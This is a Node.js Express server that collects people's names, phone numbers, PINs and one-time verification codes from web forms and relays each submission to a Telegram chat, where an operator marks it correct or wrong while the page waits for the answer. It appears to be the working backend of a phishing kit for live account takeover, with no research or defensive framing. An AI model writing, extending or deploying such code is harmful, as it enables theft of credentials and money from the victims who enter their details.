require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

// Store approval states
const approvedPins = {};
const approvedCodes = {};

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ---------------- TELEGRAM HELPERS ----------------
async function sendTelegramMessage(text, inlineKeyboard) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text,
                reply_markup: { inline_keyboard: inlineKeyboard }
            }
        );
    } catch (err) {
        console.error('Telegram error:', err.message);
    }
}

async function answerCallback(callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
    } catch (err) {
        console.error('Callback error:', err.message);
    }
}

// ---------------- ROUTES ----------------

// PIN submit
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin } = req.body;
    console.log('📩 PIN received:', pin);

    approvedPins[pin] = null;

    sendTelegramMessage(
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${pin}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${pin}` }
        ]]
    );

    res.json({ status: 'pending' });
});

// PIN check
app.get('/check-pin/:pin', (req, res) => {
    const pin = req.params.pin;
    res.json({ approved: approvedPins[pin] ?? null });
});

// CODE submit
app.post('/submit-code', (req, res) => {
    const { name, phone, code } = req.body;
    console.log('📩 CODE received:', code);

    approvedCodes[code] = null;

    sendTelegramMessage(
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${code}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${code}` }
        ]]
    );

    res.json({ status: 'pending' });
});

// CODE check
app.get('/check-code/:code', (req, res) => {
    const code = req.params.code;
    res.json({ approved: approvedCodes[code] ?? null });
});

// TELEGRAM WEBHOOK
app.post('/telegram-webhook', async (req, res) => {
    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, value] = cb.data.split(':');

    if (action === 'pin_ok') approvedPins[value] = true;
    if (action === 'pin_bad') approvedPins[value] = false;

    if (action === 'code_ok') approvedCodes[value] = true;
    if (action === 'code_bad') approvedCodes[value] = false;

    await answerCallback(cb.id);
    console.log('✅ Telegram action:', action, value);

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
